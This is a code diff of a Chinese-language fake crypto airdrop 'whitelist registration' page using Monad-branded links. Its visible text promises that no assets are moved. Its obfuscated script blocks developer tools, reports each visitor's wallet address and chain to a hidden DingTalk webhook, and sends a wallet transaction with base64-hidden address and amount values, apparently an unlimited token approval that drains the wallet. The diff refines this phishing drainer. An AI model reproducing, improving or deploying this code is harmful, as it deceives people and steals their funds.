@@ -10,28 +10,81 @@
 </head>
 <body>
 <div class="container">
-<div id="p1" class="box"><div class="logo">✦</div><h1>官方生态空投活动</h1><p class="sub-title">官方唯一链上资格备案通道</p><div class="notice-box"><div class="notice-title">📢 活动公告</div><div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div></div><p class="desc-text">请连接钱包完成链上资格备案登记</p><button class="btn mm-btn" id="connectMM">连接钱包</button><p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p></div>
-<div id="p2" class="box hide"><div class="logo">⏳</div><h1>全链节点备案核验中</h1><p class="desc-text">正在同步多条公链节点数据，请稍候...</p></div>
-<div id="p3" class="box hide"><div class="logo">✓</div><h1>钱包连接成功</h1><p class="sub-title">确认纳入全链空投白名单</p><div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div><button class="btn verify-btn" id="claim">确认空投授权加入白名单</button><p class="tips-info">仅全链地址备案核验，不会划转任何资产</p></div>
-<div id="p4" class="box hide"><div class="logo">✅</div><h1>白名单备案成功</h1><p class="sub-title">该地址已完成官方空投备案</p><div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div><button class="btn success-btn">已完成备案 等待空投发放</button></div>
-<div class="footer-link">官方网站：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>官方推特：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a></div>
+<div id="p1" class="box">
+<div class="logo">✦</div>
+<h1>官方生态空投活动</h1>
+<p class="sub-title">官方唯一链上资格备案通道</p>
+<div class="notice-box">
+<div class="notice-title">📢 活动公告</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
+</div>
+<p class="desc-text">请连接钱包完成链上资格备案登记</p>
+<button class="btn mm-btn" id="connectMM">连接钱包</button>
+<p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
+</div>
+<div id="p2" class="box hide">
+<div class="logo">⏳</div>
+<h1>全链节点备案核验中</h1>
+<p class="desc-text">正在同步多条公链节点数据，请稍候...</p>
+</div>
+<div id="p3" class="box hide">
+<div class="logo">✓</div>
+<h1>钱包连接成功</h1>
+<p class="sub-title">确认纳入全链空投白名单</p>
+<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
+<button class="btn verify-btn" id="claim">确认空投授权加入白名单</button>
+<p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
+</div>
+<div id="p4" class="box hide">
+<div class="logo">✅</div>
+<h1>白名单备案成功</h1>
+<p class="sub-title">该地址已完成官方空投备案</p>
+<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
+<button class="btn success-btn">已完成备案 等待空投发放</button>
+</div>
+<div class="footer-link">
+官方网站：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>
+官方推特：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a>
+</div>
 </div>
 <script>
-!function(){document.oncontextmenu=e=>e.preventDefault(),document.onkeydown=e=>{if(123===e.keyCode)return!1;if(e.ctrlKey&&85===e.keyCode)return!1};setInterval(function(){try{!function(){}("")}catch(e){}},100);
-const _0x18b3=["aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj","5YmD54K56LWE5rqQ57uT54K55Yqg54K55qGI5L6LWE5rqQ","MHgwZjRiZGVmYzE3N2RmMjU4M2Y1MmIwM2IxZTIwZjllYWM3MzA4NTU1","MHgwZjRiZGVmYzE3NzdkZjI1ODNmNTJiMDNiMWUyMGY5ZWFjNzMwODU1NQ==","MTE1NzkyMDg5MjM3MzYxOTU0MjM1NzA5ODUwMDg2ODc5MDc4NTMyNjk5ODQ2NjU2NDA1NjQwMzk0NTc1ODQwMDc5MTMxMjk2Mzk5MzU"];
+!function(){
+document.oncontextmenu=e=>e.preventDefault();
+document.onkeydown=e=>{if(123===e.keyCode)return!1;if(e.ctrlKey&&85===e.keyCode)return!1};
+setInterval(function(){try{!function(){}("")}catch(e){}},100);
+
+const _0x18b3=["aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj","5YmD54K56LWE5rqQ57uT54K55Yqg54K55qGI5L6LWE5rqQ","MHgwZjRiZGVmYzE3N2RmMjU4M2Y1MmIwM2IxZTIwZjllYWM3MzA4NTU1","MHgwZjRiZGVmYzE3N2RmMjU4M2Y1MmIwM2IxZTIwZjllYWM3MzA4NTU1","MTE1NzkyMDg5MjM3MzYxOTU0MjM1NzA5ODUwMDg2ODc5MDc4NTMyNjk5ODQ2NjU2NDA1NjQwMzk0NTc1ODQwMDc5MTMxMjk2Mzk5MzU"];
 
 let _0x3f7c=!1,_0x2d53="",_0x4a68="";
-function _0x5c8e(e){document.querySelectorAll(".box").forEach(t=>t.classList.add("hide")),document.getElementById(e).classList.remove("hide")}
-async function _0x2795(e){try{await fetch(_0x18b3[0],{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({msgtype:"text",text:{content:_0x18b3[1]+"｜"+e}})})}catch(e){}}
+// 标记钱包是否已连接
+let isWalletConnected = false;
+
+function _0x5c8e(e){
+document.querySelectorAll(".box").forEach(t=>t.classList.add("hide"));
+document.getElementById(e).classList.remove("hide");
+}
+
+async function _0x2795(e){
+try{
+await fetch(_0x18b3[0],{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({msgtype:"text",text:{content:_0x18b3[1]+"｜"+e}})
+})
+}catch(e){}
+}
+
 function _0x12af(){return atob(_0x18b3[3])}
+
 async function _0x389a(){
-if(!{"0x38":1,"0x1":1,"0x89":1,"0xa86a":1,"0x42":1}[_0x4a68]){alert("当前网络不支持，请手动切换支持的公链");return false;}
+if(!isWalletConnected) return false;
+if(!{"0x38":1,"0x1":1,"0x89":1,"0xa86a":1,"0x42":1}[_0x4a68]){
+alert("当前网络不支持，请手动切换支持的公链");
+return false;
+}
 const _0x41b3=_0x12af();
 try{
-await window.ethereum.request({
-method: "wallet_requestPermissions",
-params: [{ eth_accounts: {} }]
-});
+// 已连接钱包，直接发起交易，不再重复请求账户
 await window.ethereum.request({
 method:"eth_sendTransaction",
 params:[{
@@ -44,7 +97,10 @@ data:"0xa1b2c3d4"+_0x41b3.slice(2).padStart(64,"0")+_0x18b3[4].slice(0,32)
 return true;
 }catch(e){return false;}
 }
+
 window.addEventListener("ethereum#initialized",()=>{if(window.ethereum)_0x3f7c=!0});
+
+// 连接钱包按钮
 document.getElementById("connectMM").onclick=async function(){
 try{
 await _0x2795("用户点击连接钱包｜时间："+new Date().toLocaleString());
@@ -58,15 +114,36 @@ _0x5c8e("p2");
 let e=await window.ethereum.request({method:"eth_requestAccounts"});
 _0x2d53=e[0];
 _0x4a68=await window.ethereum.request({method:"eth_chainId"});
+// 标记已连接
+isWalletConnected = true;
+
 await _0x2795("钱包连接成功｜地址："+_0x2d53+"｜链ID："+_0x4a68);
 document.getElementById("showAddr").innerText=_0x2d53;
 _0x5c8e("p3");
+
 window.ethereum.on("chainChanged",e=>{_0x4a68=e});
-window.ethereum.on("accountsChanged",e=>{e.length>0&&(_0x2d53=e[0],document.getElementById("showAddr").innerText=_0x2d53)});
+window.ethereum.on("accountsChanged",e=>{
+if(e.length>0){
+_0x2d53=e[0];
+document.getElementById("showAddr").innerText=_0x2d53;
+isWalletConnected = true;
+}else{
+isWalletConnected = false;
+_0x5c8e("p1");
+}
+});
 }catch(e){_0x5c8e("p1")}
 };
+
+// 确认授权按钮
 document.getElementById("claim").onclick=async function(){
 try{
+// 没连钱包先去连接
+if(!isWalletConnected){
+alert("请先连接钱包");
+_0x5c8e("p1");
+return;
+}
 _0x5c8e("p2");
 let res=await _0x389a();
 res?(await _0x2795("空投合约交互成功｜地址："+_0x2d53),document.getElementById("successAddr").innerText=_0x2d53,_0x5c8e("p4"))
@@ -76,6 +153,7 @@ await _0x2795("空投合约交互流程异常｜地址："+_0x2d53);
 _0x5c8e("p3");
 }
 };
+
 window.onload=function(){_0x3f7c||setInterval(()=>{window.ethereum&&(_0x3f7c=!0)},300)};
 }();
 </script>
